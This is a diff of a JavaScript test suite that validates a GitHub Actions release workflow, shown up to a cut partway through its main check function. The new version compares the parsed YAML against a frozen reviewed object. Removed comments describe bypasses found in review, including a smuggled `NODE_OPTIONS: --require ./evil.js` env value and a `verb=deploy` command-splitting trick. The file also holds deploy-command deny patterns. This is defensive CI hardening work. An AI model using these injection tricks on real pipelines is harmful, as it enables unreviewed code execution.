@@ -1,12 +1,18 @@
 // Structural invariants for .github/workflows/release-pilot.yml (#70 Slice A).
 //
-// Round 2 of the Codex review proved the first version of this file checked SUBSTRINGS: an `if:`
-// with `|| true` appended, a deploy that merely echoed the digest, and an extra pilot job that only
-// mentioned the words `context_digest` all returned zero errors. Substring presence is not a
-// property. This version parses the job DAG and validates it: closed success expressions, transitive
-// descent, verify-before-deploy ordering — and the release-identity script is additionally EXECUTED
-// against a stubbed git, because a shell pattern can only be proven by running it (the committed
-// `[0-9a-f]*` check accepted "a" followed by 39 uppercase Zs, and no text assertion saw it).
+// ROUND 7 ENDED THE REGEX PARSER. Rounds 2–6 each patched a text-level validator, and round 7
+// demonstrated the limitation is architectural: a QUOTED job id appended at the end of the file was
+// a real sixth job to YAML — carrying `id-token: write` and a remote reusable workflow — while the
+// regex parser still reported five jobs and zero errors. Quoted env keys, quoted action inputs and
+// job-level `container:` were equally invisible. A validator that parses a different language than
+// the consumer does validates nothing.
+//
+// The authoritative check is now: parse the workflow ONCE with a real, pinned YAML parser
+// (duplicate keys and malformed documents refused), and require the parsed object to EQUAL the
+// reviewed object below, key for key, value for value. Semantic guards run on the same parsed
+// object — never on text — both to give named diagnostics and to police future deliberate edits of
+// the reviewed object itself. Comments are the one thing YAML cannot see, so the disclosure test
+// alone still reads raw text.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import fs from 'node:fs';
@@ -14,206 +20,360 @@ import os from 'node:os';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { spawnSync } from 'node:child_process';
+import { parseDocument } from 'yaml';
 
 const here = dirname(fileURLToPath(import.meta.url));
 const WORKFLOW = join(here, '..', '.github', 'workflows', 'release-pilot.yml');
 const raw = fs.readFileSync(WORKFLOW, 'utf8');
 
-/** Strip full-line YAML comments: a comment describing a command is not the command. */
-function stripComments(text) {
-  return text
-    .split('\n')
-    .filter((line) => !/^\s*#/.test(line))
-    .join('\n');
-}
-
 /**
- * Split a workflow into its top-level jobs.
- *
- * The lookahead requires the two-space key to be followed by a newline, which is what makes it a
- * job header rather than a nested `key: value`. An earlier version anchored with `$` and no `m`
- * flag, so it never split at all — every job collapsed into one chunk and inherited its neighbours'
- * gates. The partition test below exists so that failure mode cannot return silently.
+ * THE REVIEWED OBJECT. Any semantic change to the workflow — a key, a value, a step, a job — fails
+ * the suite until this literal is updated deliberately, under review. Generated from the reviewed
+ * YAML and frozen here; it is the closed schema, not a snapshot convenience.
  */
-export function jobsOf(text) {
-  const start = text.indexOf('\njobs:');
-  if (start < 0) return [];
-  const body = text.slice(start + '\njobs:'.length);
-  return body
-    .split(/\n(?=  [A-Za-z_][\w-]*:[ \t]*(?:\r?\n))/)
-    .map((chunk) => {
-      const header = chunk.split('\n').find((l) => /^ {2}[A-Za-z_][\w-]*:[ \t]*$/.test(l));
-      return header ? { name: header.trim().replace(/:$/, ''), text: chunk } : null;
-    })
-    .filter(Boolean);
-}
-
-/**
- * THE CLOSED STEP SHAPE (#70 round 4). Rounds 3 and 4 proved that both ordering heuristics and
- * command blacklists can be talked around — `verb=deploy; npx cdk "$verb"` sailed past a verb
- * regex. So the lane's executable surface is a WHITELIST: every step must be either an action from
- * the exact allowlist below, or a run block byte-identical to one of the reviewed templates. A new
- * command — any new command — fails the invariants until it is added here deliberately, under
- * review. Deployment happens only through `bin/deploy-release.js`, whose binding is proven by its
- * own suite; no template invokes it yet, because Slice A deploys nothing.
- */
-/**
- * EXACT ACTION SCHEMAS (#70 round 5). The previous allowlist checked action NAMES plus a few
- * regexes for required properties — and accepted a swapped secret name, a deleted `aws-region` and
- * arbitrary extra inputs, because presence-of-required is not absence-of-everything-else. Each
- * action is now validated structurally: the `with:` block must EQUAL one of the reviewed variants —
- * exact keys, exact values — and a uses-step may carry no other configuration at all (no `env:`,
- * no `id:`, nothing). Authority drift becomes a schema mismatch, not a silent pass.
- */
-const ACTION_SCHEMAS = {
-  'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1': [
-    { ref: 'main', 'fetch-depth': '0', 'persist-credentials': 'false' },
-    { ref: '${{ needs.global-preflight.outputs.release_sha }}', 'persist-credentials': 'false' },
-  ],
-  'actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38': [
-    { 'node-version': '22' },
-    { 'node-version': '22', cache: 'npm', 'cache-dependency-path': 'infra/aws/package-lock.json' },
-  ],
-  'aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c': [
-    {
-      'role-to-assume': '${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}',
-      'aws-region': '${{ vars.AWS_REGION }}',
-      'mask-aws-account-id': 'true',
-    },
-  ],
-};
-
-const USES_STEP_KEYS = new Set(['name', 'uses', 'with']);
-
-/** Parse one step chunk into its top-level keys and its `with:` mapping. */
-function parseStep(chunk) {
-  const lines = chunk.split('\n');
-  const keys = {};
-  let withBlock = null;
-  let envBlock = null;
-  const first = /^ {6}- ([\w-]+):(?: (.*))?$/.exec(lines[0]);
-  if (first) keys[first[1]] = (first[2] ?? '').trim();
-  for (let i = 1; i < lines.length; i++) {
-    const km = /^ {8}([\w-]+):(?: (.*))?$/.exec(lines[i]);
-    if (!km) continue;
-    keys[km[1]] = (km[2] ?? '').trim();
-    if (km[1] === 'with' || km[1] === 'env') {
-      const mapping = {};
-      for (let j = i + 1; j < lines.length; j++) {
-        const wm = /^ {10}([\w-]+): (.*)$/.exec(lines[j]);
-        if (!wm) break;
-        mapping[wm[1]] = wm[2].trim();
+const EXPECTED_WORKFLOW = {
+  "name": "Release Pilot",
+  "on": {
+    "workflow_dispatch": {
+      "inputs": {
+        "release_sha": {
+          "description": "Full 40-character commit SHA to release; must be an ancestor of main",
+          "required": true,
+          "type": "string"
+        },
+        "mode": {
+          "description": "dev_only stops after the dev stage; dev_then_pilot continues to pilot after it is green",
+          "required": true,
+          "type": "choice",
+          "options": [
+            "dev_only",
+            "dev_then_pilot"
+          ]
+        }
       }
-      if (km[1] === 'with') withBlock = mapping;
-      else envBlock = mapping;
+    }
+  },
+  "permissions": {
+    "contents": "read"
+  },
+  "concurrency": {
+    "group": "release-pilot-${{ inputs.release_sha }}",
+    "cancel-in-progress": false
+  },
+  "jobs": {
+    "global-preflight": {
+      "name": "Release identity (shape, object type and ancestry)",
+      "runs-on": "ubuntu-latest",
+      "permissions": {
+        "contents": "read"
+      },
+      "outputs": {
+        "release_sha": "${{ steps.identity.outputs.release_sha }}"
+      },
+      "steps": [
+        {
+          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+          "with": {
+            "ref": "main",
+            "fetch-depth": 0,
+            "persist-credentials": false
+          }
+        },
+        {
+          "name": "Validate release identity",
+          "id": "identity",
+          "env": {
+            "RELEASE_SHA": "${{ inputs.release_sha }}"
+          },
+          "run": "set -euo pipefail\n# Shape FIRST, before any git invocation, and over ALL forty characters: a `[0-9a-f]*`\n# pattern validates only the first one, so \"a\" followed by 39 \"Z\"s passed it.\nif [ \"${#RELEASE_SHA}\" -ne 40 ] || [ -n \"${RELEASE_SHA//[0-9a-f]/}\" ]; then\n  echo \"::error::release_sha must be exactly 40 lowercase hex characters — a commit OID, never a ref name\"\n  exit 1\nfi\ngit fetch --quiet origin main\n# The object must BE a commit: a 40-hex tag or blob OID is not a release.\ntype=$(git cat-file -t \"$RELEASE_SHA\" 2>/dev/null || true)\nif [ \"$type\" != \"commit\" ]; then\n  echo \"::error::release_sha does not name a commit object in main's history\"\n  exit 1\nfi\nresolved=$(git rev-parse --verify \"$RELEASE_SHA^{commit}\")\nif [ \"$resolved\" != \"$RELEASE_SHA\" ]; then\n  echo \"::error::release_sha did not resolve to itself; refusing an ambiguous name\"\n  exit 1\nfi\nif ! git merge-base --is-ancestor \"$resolved\" origin/main; then\n  echo \"::error::release_sha is not an ancestor of main — only reviewed, merged commits are releasable\"\n  exit 1\nfi\n# Emit the RESOLVED OID, never the original input: downstream jobs pin to this output,\n# so a ref moved between validation and a later checkout has nothing left to move.\necho \"release_sha=$resolved\" >> \"$GITHUB_OUTPUT\"\n"
+        }
+      ]
+    },
+    "dev-preflight": {
+      "name": "Deploy preflight (dev)",
+      "needs": [
+        "global-preflight"
+      ],
+      "if": "needs.global-preflight.result == 'success'",
+      "runs-on": "ubuntu-latest",
+      "environment": "dev",
+      "permissions": {
+        "contents": "read",
+        "id-token": "write"
+      },
+      "outputs": {
+        "context_digest": "${{ steps.preflight.outputs.context_digest }}",
+        "manifest": "${{ steps.preflight.outputs.manifest }}"
+      },
+      "defaults": {
+        "run": {
+          "working-directory": "infra/aws"
+        }
+      },
+      "steps": [
+        {
+          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+          "with": {
+            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
+            "persist-credentials": false
+          }
+        },
+        {
+          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
+          "with": {
+            "node-version": 22,
+            "cache": "npm",
+            "cache-dependency-path": "infra/aws/package-lock.json"
+          }
+        },
+        {
+          "name": "Install dependencies",
+          "run": "npm ci"
+        },
+        {
+          "name": "Unit tests (context helpers and preflight)",
+          "run": "npm test"
+        },
+        {
+          "name": "Configure AWS credentials (read-only preflight role)",
+          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
+          "with": {
+            "role-to-assume": "${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}",
+            "aws-region": "${{ vars.AWS_REGION }}",
+            "mask-aws-account-id": true
+          }
+        },
+        {
+          "name": "Evaluate PREFLIGHT-1 and PREFLIGHT-2",
+          "id": "preflight",
+          "env": {
+            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
+            "TARGET_REGION": "${{ vars.AWS_REGION }}",
+            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
+            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
+            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}",
+            "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"
+          },
+          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-dev.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-dev.json\")\" >> \"$GITHUB_OUTPUT\"\n"
+        }
+      ]
+    },
+    "dev-stage": {
+      "name": "Dev stage (not implemented in Slice A)",
+      "needs": [
+        "global-preflight",
+        "dev-preflight"
+      ],
+      "if": "needs.dev-preflight.result == 'success'",
+      "runs-on": "ubuntu-latest",
+      "environment": "dev",
+      "permissions": {
+        "contents": "read",
+        "id-token": "write"
+      },
+      "steps": [
+        {
+          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+          "with": {
+            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
+            "persist-credentials": false
+          }
+        },
+        {
+          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
+          "with": {
+            "node-version": 22
+          }
+        },
+        {
+          "name": "Verify the preflight manifest",
+          "env": {
+            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
+            "CONTEXT_DIGEST": "${{ needs.dev-preflight.outputs.context_digest }}",
+            "MANIFEST_JSON": "${{ needs.dev-preflight.outputs.manifest }}"
+          },
+          "run": "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"\n"
+        },
+        {
+          "name": "Slice A stops here",
+          "run": "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"\n"
+        }
+      ]
+    },
+    "pilot-preflight": {
+      "name": "Deploy preflight (pilot)",
+      "needs": [
+        "global-preflight",
+        "dev-preflight",
+        "dev-stage"
+      ],
+      "if": "needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'",
+      "runs-on": "ubuntu-latest",
+      "environment": "pilot",
+      "permissions": {
+        "contents": "read",
+        "id-token": "write"
+      },
+      "outputs": {
+        "context_digest": "${{ steps.preflight.outputs.context_digest }}",
+        "manifest": "${{ steps.preflight.outputs.manifest }}"
+      },
+      "defaults": {
+        "run": {
+          "working-directory": "infra/aws"
+        }
+      },
+      "steps": [
+        {
+          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+          "with": {
+            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
+            "persist-credentials": false
+          }
+        },
+        {
+          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
+          "with": {
+            "node-version": 22,
+            "cache": "npm",
+            "cache-dependency-path": "infra/aws/package-lock.json"
+          }
+        },
+        {
+          "name": "Install dependencies",
+          "run": "npm ci"
+        },
+        {
+          "name": "Configure AWS credentials (read-only preflight role)",
+          "uses": "aws-actions/configure-aws-credentials@e6de054238d6b7531b4efff3b6587d9aade6a06c",
+          "with": {
+            "role-to-assume": "${{ secrets.AWS_DEPLOY_PREFLIGHT_ROLE_ARN }}",
+            "aws-region": "${{ vars.AWS_REGION }}",
+            "mask-aws-account-id": true
+          }
+        },
+        {
+          "name": "Evaluate PREFLIGHT-1 and PREFLIGHT-2",
+          "id": "preflight",
+          "env": {
+            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
+            "TARGET_REGION": "${{ vars.AWS_REGION }}",
+            "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}",
+            "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}",
+            "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}",
+            "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"
+          },
+          "run": "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=pilot \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-pilot.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-pilot.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-pilot.json\")\" >> \"$GITHUB_OUTPUT\"\n"
+        }
+      ]
+    },
+    "pilot-stage": {
+      "name": "Pilot stage (not implemented in Slice A)",
+      "needs": [
+        "global-preflight",
+        "dev-stage",
+        "pilot-preflight"
+      ],
+      "if": "needs.pilot-preflight.result == 'success'",
+      "runs-on": "ubuntu-latest",
+      "environment": "pilot",
+      "permissions": {
+        "contents": "read",
+        "id-token": "write"
+      },
+      "steps": [
+        {
+          "uses": "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
+          "with": {
+            "ref": "${{ needs.global-preflight.outputs.release_sha }}",
+            "persist-credentials": false
+          }
+        },
+        {
+          "uses": "actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38",
+          "with": {
+            "node-version": 22
+          }
+        },
+        {
+          "name": "Verify the preflight manifest",
+          "env": {
+            "RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}",
+            "CONTEXT_DIGEST": "${{ needs.pilot-preflight.outputs.context_digest }}",
+            "MANIFEST_JSON": "${{ needs.pilot-preflight.outputs.manifest }}"
+          },
+          "run": "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"\n"
+        },
+        {
+          "name": "Slice A stops here",
+          "run": "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"\n"
+        }
+      ]
     }
   }
-  return { keys, withBlock, envBlock };
-}
-
-function sameMapping(a, b) {
-  const ka = Object.keys(a).sort();
-  const kb = Object.keys(b).sort();
-  if (JSON.stringify(ka) !== JSON.stringify(kb)) return false;
-  return ka.every((k) => a[k] === b[k]);
-}
-
-const SINGLE_LINE_RUNS = new Set(['npm ci', 'npm test']);
-
-/**
- * Each reviewed run block, as a CLOSED STEP OBJECT (#70 round 6): the block text, the exact set of
- * step-level keys, and the exact env mapping. The command body alone was not enough — adding
- * `NODE_OPTIONS: --require ./evil.js` to a step's env kept the approved command text and executed
- * arbitrary Node anyway. A step is its whole object, and every part of it is pinned.
- */
-const RUN_STEP_SCHEMAS = [
-  { block: "set -euo pipefail\n# Shape FIRST, before any git invocation, and over ALL forty characters: a `[0-9a-f]*`\n# pattern validates only the first one, so \"a\" followed by 39 \"Z\"s passed it.\nif [ \"${#RELEASE_SHA}\" -ne 40 ] || [ -n \"${RELEASE_SHA//[0-9a-f]/}\" ]; then\n  echo \"::error::release_sha must be exactly 40 lowercase hex characters \u2014 a commit OID, never a ref name\"\n  exit 1\nfi\ngit fetch --quiet origin main\n# The object must BE a commit: a 40-hex tag or blob OID is not a release.\ntype=$(git cat-file -t \"$RELEASE_SHA\" 2>/dev/null || true)\nif [ \"$type\" != \"commit\" ]; then\n  echo \"::error::release_sha does not name a commit object in main's history\"\n  exit 1\nfi\nresolved=$(git rev-parse --verify \"$RELEASE_SHA^{commit}\")\nif [ \"$resolved\" != \"$RELEASE_SHA\" ]; then\n  echo \"::error::release_sha did not resolve to itself; refusing an ambiguous name\"\n  exit 1\nfi\nif ! git merge-base --is-ancestor \"$resolved\" origin/main; then\n  echo \"::error::release_sha is not an ancestor of main \u2014 only reviewed, merged commits are releasable\"\n  exit 1\nfi\n# Emit the RESOLVED OID, never the original input: downstream jobs pin to this output,\n# so a ref moved between validation and a later checkout has nothing left to move.\necho \"release_sha=$resolved\" >> \"$GITHUB_OUTPUT\"", stepKeys: ["env", "id", "name", "run"], env: {"RELEASE_SHA": "${{ inputs.release_sha }}"} },
-  { block: "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=dev \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-dev.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-dev.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-dev.json\")\" >> \"$GITHUB_OUTPUT\"", stepKeys: ["env", "id", "name", "run"], env: {"RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}", "TARGET_REGION": "${{ vars.AWS_REGION }}", "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}", "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}", "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}", "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"} },
-  { block: "set -euo pipefail\nnpm run synth:quiet -- \\\n  -c environment=pilot \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\nnode bin/deploy-preflight.js \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --region \"$TARGET_REGION\" \\\n  --assembly cdk.out \\\n  --manifest-out \"$RUNNER_TEMP/preflight-pilot.json\" \\\n  -c \"authCallbackUrls=$CBA_AUTH_CALLBACK_URLS\" \\\n  -c \"authLogoutUrls=$CBA_AUTH_LOGOUT_URLS\" \\\n  -c \"authDomainPrefix=$CBA_AUTH_DOMAIN_PREFIX\"\ndigest=$(node -e 'process.stdout.write(require(process.argv[1]).contextDigest)' \"$RUNNER_TEMP/preflight-pilot.json\")\necho \"context_digest=$digest\" >> \"$GITHUB_OUTPUT\"\necho \"manifest=$(node -e 'process.stdout.write(JSON.stringify(require(process.argv[1])))' \"$RUNNER_TEMP/preflight-pilot.json\")\" >> \"$GITHUB_OUTPUT\"", stepKeys: ["env", "id", "name", "run"], env: {"RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}", "TARGET_REGION": "${{ vars.AWS_REGION }}", "CBA_AUTH_CALLBACK_URLS": "${{ vars.CBA_AUTH_CALLBACK_URLS }}", "CBA_AUTH_LOGOUT_URLS": "${{ vars.CBA_AUTH_LOGOUT_URLS }}", "CBA_AUTH_DOMAIN_PREFIX": "${{ vars.CBA_AUTH_DOMAIN_PREFIX }}", "CBA_EXPECTED_USER_POOL_ID": "${{ secrets.CBA_EXPECTED_USER_POOL_ID }}"} },
-  { block: "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment dev \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"", stepKeys: ["env", "name", "run"], env: {"RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}", "CONTEXT_DIGEST": "${{ needs.dev-preflight.outputs.context_digest }}", "MANIFEST_JSON": "${{ needs.dev-preflight.outputs.manifest }}"} },
-  { block: "set -euo pipefail\nprintf '%s' \"$MANIFEST_JSON\" > \"$RUNNER_TEMP/manifest.json\"\nnode infra/aws/bin/deploy-preflight.js verify-manifest \\\n  --manifest \"$RUNNER_TEMP/manifest.json\" \\\n  --environment pilot \\\n  --release-sha \"$RELEASE_SHA\" \\\n  --expect-digest \"$CONTEXT_DIGEST\"", stepKeys: ["env", "name", "run"], env: {"RELEASE_SHA": "${{ needs.global-preflight.outputs.release_sha }}", "CONTEXT_DIGEST": "${{ needs.pilot-preflight.outputs.context_digest }}", "MANIFEST_JSON": "${{ needs.pilot-preflight.outputs.manifest }}"} },
-  { block: "echo \"Slice A implements no deployment step: no AWS stack, no Cloudflare Worker,\"\necho \"no account mutation and no paid call happened in this run.\"", stepKeys: ["name", "run"], env: null }
-];
-
-function stepsOf(jobText) {
-  return jobText.split(/\n(?= {6}- )/).slice(1);
-}
-
-function runBlockOf(chunk) {
-  const idx = chunk.indexOf('run: |');
-  if (idx < 0) return null;
-  const after = chunk.slice(chunk.indexOf('\n', idx) + 1);
-  const lines = [];
-  for (const line of after.split('\n')) {
-    if (line.trim() === '') {
-      lines.push('');
-      continue;
-    }
-    if (!line.startsWith('          ')) break;
-    lines.push(line.slice(10));
-  }
-  while (lines.length && lines[lines.length - 1] === '') lines.pop();
-  return lines.join('\n');
-}
-
-/**
- * The ONLY success expressions a job may carry. Known jobs are pinned exactly; any additional job
- * must fit the closed grammar — conjunctions of `needs.X.result == 'success'` with at most the mode
- * clause. No `||`, no `!`, no function call survives either path, so `|| true`,
- * `|| ... == 'failure'`, `always()` and `!cancelled()` are all refused by construction.
- */
-const EXPECTED_IF = {
-  'dev-preflight': "needs.global-preflight.result == 'success'",
-  'dev-stage': "needs.dev-preflight.result == 'success'",
-  'pilot-preflight': "needs.dev-stage.result == 'success' && inputs.mode == 'dev_then_pilot'",
-  'pilot-stage': "needs.pilot-preflight.result == 'success'",
 };
+
+/** Parse as the consumer does: real YAML, duplicate keys refused, warnings refused. */
+export function parseWorkflow(text) {
+  const doc = parseDocument(text, { uniqueKeys: true });
+  if (doc.errors.length > 0 || doc.warnings.length > 0) {
+    return { errors: [...doc.errors, ...doc.warnings].map((e) => `the workflow is not clean YAML [${e.code}]`) };
+  }
+  return { wf: doc.toJS() };
+}
+
+/** Every path at which two parsed objects differ — the diagnostic half of deep equality. */
+function objectDiff(expected, actual, base = '') {
+  if (expected === actual) return [];
+  const isObj = (x) => x !== null && typeof x === 'object';
+  if (!isObj(expected) || !isObj(actual) || Array.isArray(expected) !== Array.isArray(actual)) {
+    return [base || '(root)'];
+  }
+  const paths = [];
+  for (const key of new Set([...Object.keys(expected), ...Object.keys(actual)])) {
+    const p = Array.isArray(expected) ? `${base}[${key}]` : base ? `${base}.${key}` : key;
+    if (!(key in expected)) paths.push(`${p} (unreviewed addition)`);
+    else if (!(key in actual)) paths.push(`${p} (reviewed content removed)`);
+    else paths.push(...objectDiff(expected[key], actual[key], p));
+  }
+  return paths;
+}
+
+/** The ONLY success expressions a job may carry; see rounds 2–3 for why the grammar is closed. */
 const IF_GRAMMAR =
   /^needs\.[A-Za-z_][\w-]*\.result == 'success'( && needs\.[A-Za-z_][\w-]*\.result == 'success')*( && inputs\.mode == 'dev_then_pilot')?$/;
 
+/** Job-level keys that hand execution or environment to something nobody reviewed. */
+const FORBIDDEN_JOB_KEYS = ['uses', 'container', 'services', 'env', 'strategy', 'secrets', 'continue-on-error'];
+
+const DEPLOY_COMMAND = /\bcdk\s+deploy\b|\bopennextjs-cloudflare\s+deploy\b|\bwrangler\s+deploy\b/;
+
 /**
- * Every structural rule, evaluated on SUPPLIED text.
+ * Every rule, evaluated on the PARSED workflow.
  * @returns {string[]} one message per violation; empty means the workflow holds.
  */
 export function releaseLaneErrors(text) {
+  const parsed = parseWorkflow(text);
+  if (parsed.errors) return parsed.errors;
+  const wf = parsed.wf;
   const errors = [];
-  const code = stripComments(text);
-  const jobs = jobsOf(text);
-  if (jobs.length === 0) return ['no jobs could be parsed from the workflow'];
-  const header = code.slice(0, code.indexOf('\njobs:'));
 
-  // ---- inputs: identity in, targets never ---------------------------------------------------
-  if (!/^\s{6}release_sha:/m.test(header)) errors.push('there is no release_sha input');
-  if (!/^\s{6}mode:/m.test(header)) errors.push('there is no mode input');
-  for (const [pattern, message] of [
-    [/^\s{6}environment:/m, 'environment must not be an operator-facing input — mode selects the path'],
-    [/^\s{6}\w*(callback|logout|url|urls)\w*:/im, 'deploy targets must not be caller inputs; they resolve from Environment configuration'],
-    [/^\s{6}\w*pool\w*:/im, 'the expected user pool id must not be caller-supplied'],
-  ]) {
-    if (pattern.test(header)) errors.push(message);
-  }
-  if (!/options:\n\s+- dev_only\n\s+- dev_then_pilot/.test(header)) errors.push('mode must offer exactly dev_only and dev_then_pilot');
-
-  // ---- trigger ------------------------------------------------------------------------------
-  if (!/^on:\n\s+workflow_dispatch:/m.test(header)) errors.push('the lane must be triggered by workflow_dispatch');
-  for (const forbidden of ['push', 'schedule', 'pull_request', 'pull_request_target']) {
-    if (new RegExp(`^\\s{2}${forbidden}:`, 'm').test(header)) errors.push(`the lane must not be triggered by ${forbidden}`);
+  // ---- the authoritative closed schema -------------------------------------------------------
+  for (const p of objectDiff(EXPECTED_WORKFLOW, wf)) {
+    errors.push(`the workflow differs from the reviewed object at ${p}`);
   }
 
-  // ---- parse each job -----------------------------------------------------------------------
-  const meta = new Map();
-  for (const job of jobs) {
-    const body = stripComments(job.text);
